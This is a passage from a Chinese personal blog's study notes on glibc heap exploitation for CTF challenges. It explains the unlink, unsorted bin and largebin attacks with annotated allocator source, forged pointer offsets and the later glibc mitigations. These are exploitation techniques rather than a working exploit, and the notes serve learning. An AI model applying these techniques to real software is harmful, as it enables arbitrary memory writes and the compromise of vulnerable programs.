+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd</span><br><span class="line">BK = P-&gt;bk</span><br><span class="line"><span class="comment">//条件</span></span><br><span class="line">FD-&gt;bk == P</span><br><span class="line">BK-&gt;fd == P</span><br><span class="line"><span class="comment">//上述内容未达到则报错</span></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br><span class="line"><span class="comment">//上述为unlink过程</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以进行一个精心构造</p>
+<blockquote>
+<p>p-&gt;fd&#x3D;p-0x18</p>
+<p>p-&gt;bk&#x3D;p-0x10</p>
+<p>这样(p-&gt;fd)-&gt;bk&#x3D;p;(p-&gt;bk)-&gt;fd&#x3D;p满足条件</p>
+<p>并且在unlink后得到p&#x3D;p-0x18</p>
+<p>(即原本指向chunk的指针指到了我们所能控制的地方，比如存放chunk地址的bss段上，后面的操作之前在house of spirit上用到过，若直接打got表的话会覆盖掉一些其他函数的got可能会报错)</p>
+</blockquote>
+<p>在glibc 2.29上又增加了unlink的相关检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完善了保护后的绕过就更加困难了</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5748">unlink的理解和各种题型总结</a></p>
+<h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p>一个可以做到改大某地址所存内容的操作</p>
+<h4 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h4><p>unsorted bin中取chunk的一段源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+
+<p>如果我们把unsorted bin中的某个chunk的bk指针改为target_addr-16实现的功能就是在target_addr中写入<code>unsorted_chunks (av)</code>(即我们不能控制写入值是多少，唯一知道的是它是一个较大的数)</p>
+<p>但是在glibc 2.29下加入了更多的检测使得unsorted bin attack在glibc 2.29下几乎不可利用</p>
+<h4 id="相关题目-1"><a href="#相关题目-1" class="headerlink" title="相关题目"></a>相关题目</h4><p>wiki上的题目，改了个样子，直接编译的做不了，glibc版本高了会触发unsorted bin的相关检查导致报错，环境换成2.27后能打通</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hash-hash/pwn/tree/main/heap%20learning/expensive_shop">附件</a></p>
+<h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/237497.html">glibc2.29下unsortedbin_attack的替代方法</a></p>
+<h3 id="Largebin-Attack"><a href="#Largebin-Attack" class="headerlink" title="Largebin Attack"></a>Largebin Attack</h3><p>能实现和unsortedbin attack类似的效果</p>
+<p>之前都没怎么了解largebin的结构，正好学习一下</p>
+<p>large bin一共包括63个bin，index为64-126，每个bin中的chunk大小不一致，而是处于一定的范围内，在large bin中除了fd、bk指针，还有fd_nextsize和bk_nextsize两指针</p>
+<p>区间按等差数列定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                </span></span><br><span class="line">  (((((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :</span><br><span class="line">   ((((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :</span><br><span class="line">   ((((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :</span><br><span class="line">   ((((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :</span><br><span class="line">   ((((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="type">unsigned</span> <span class="type">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可知0x400-0x440都储存在index为64的large bin中</p>
+<p>借用一下大佬的博客里的一张图，简洁明了</p>
+<img src="/2022/07/04/%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/pic3.png" class>
+
+<p>相同index下</p>
+<ul>
+<li>按照大小从大到小排序</li>
+<li>若大小相同，按照free时间排序</li>
+<li>若干个大小相同的堆块，只有首堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块，后面堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0</li>
+<li>size最大的chunk的<code>bk_nextsize</code>指向最小chunk；size最小的chunk的<code>fd_nextsize</code>指向最大的chunk</li>
+</ul>
+<h4 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h4><p>主要有两种利用方式</p>
+<ul>
+<li>向largebin插入时，向某区域写堆地址</li>
+</ul>
+<p>在glibc 2.30前能够利用，glibc2.30后加入了相关检查</p>
+<p>large_bin attack需要在<code>large_bin</code>和<code>unsorted_bin</code>中分别布置一个chunk，且需要在归位后处在同一个<code>large_bin</code>的index中，且<code>unsorted_bin</code>中的chunk要更大，同时<code>large_bin</code>的<code>bk</code>和<code>bk_nextsize</code>可控</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  ...<span class="comment">//将largebin从unsorted bin中取下</span></span><br><span class="line">  unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">  bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">                 <span class="comment">//否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位</span></span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//由于fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span></span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//victim-&gt;bk_nextsize可控，因此实现了往任意地址写victim的能力</span></span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk; <span class="comment">//由于fwd-&gt;bk可控，因此bck可控</span></span><br><span class="line">         ...</span><br><span class="line"></span><br><span class="line">  mark_bin (av, victim_index);</span><br><span class="line">  <span class="comment">//设置fd与bk完成插入</span></span><br><span class="line">  victim-&gt;bk = bck; </span><br><span class="line">  victim-&gt;fd = fwd;</span><br><span class="line">  fwd-&gt;bk = victim;</span><br><span class="line">  bck-&gt;fd = victim; <span class="comment">//bck可控，因此实现了往任意地址写victim的能力</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>从largebin中申请伪造chunk</li>
+</ul>
+<h4 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5177#toc-0">浅析largebin attack</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183877#h3-2">ptmalloc利用之largebin attack</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://hash-hash.github.io/2022/07/04/%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/">https://hash-hash.github.io/2022/07/04/%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"># 堆利用</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/07/06/lattice-theory/">lattice theory</a>
+            
+            
+            <a class="next" rel="next" href="/2022/07/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">汇编语言</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
